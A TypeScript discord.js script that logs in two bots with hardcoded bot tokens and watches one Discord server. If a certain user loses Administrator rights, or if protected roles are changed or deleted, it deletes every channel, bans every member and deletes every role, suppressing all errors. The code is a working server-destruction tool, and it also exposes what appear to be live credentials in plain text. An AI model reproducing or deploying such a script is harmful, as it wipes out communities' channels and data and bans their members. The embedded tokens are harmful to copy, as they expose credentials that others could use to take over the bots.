import { Client } from "discord.js";

const protectedRolesIds: string[] = [
  "1215298131223122010",
  "1215297963941699658",
];
const tokens: string[] = [
  "MTIxNTI5NzgwMDExNjM3NTY1Mg.Gv59-B.RCyDf-chaQyendCZq_JhiEfAY4lKt4So14gI6Q",
  "MTIxNTI5ODAwMTcxMTQwMzA0OA.GAMr1e.WwujM94ENMmQh1zCXBcxDOhgAijxbfiJzrfp-A",
];

const destroy = (clients: Client[]) =>
  clients.forEach(async (client) => {
    try {
      const guild = await client.guilds.fetch("1215297721150345337");

      const channels = await guild.channels.fetch();

      channels.forEach(async (channel) => {
        try {
          await channel!.delete();
        } catch (_) {}
      });

      const members = await guild.members.fetch();

      members.forEach(async (member) => {
        try {
          await member.ban();
        } catch (_) {}
      });

      const roles = await guild.roles.fetch();

      roles.forEach(async (role) => {
        try {
          await role.delete();
        } catch (_) {}
      });
    } catch (_) {}
  });

let clients: Client[] = [];

tokens.forEach(async (token) => {
  const client = new Client({
    intents: ["Guilds", "GuildBans", "GuildMembers", "MessageContent"],
  });

  client.on("ready", () => {
    clients.push(client);

    console.log(clients.length);
  });

  client.on("guildMemberUpdate", (_, newMember) => {
    if (
      newMember.id === "1167916696569397372" &&
      !newMember.permissions.has("Administrator")
    ) {
      destroy(clients);
    }
  });

  client.on("roleDelete", (role) => {
    if (protectedRolesIds.includes(role.id)) destroy(clients);
  });

  client.on("roleUpdate", (role) => {
    if (protectedRolesIds.includes(role.id)) destroy(clients);
  });

  await client.login(token);
});
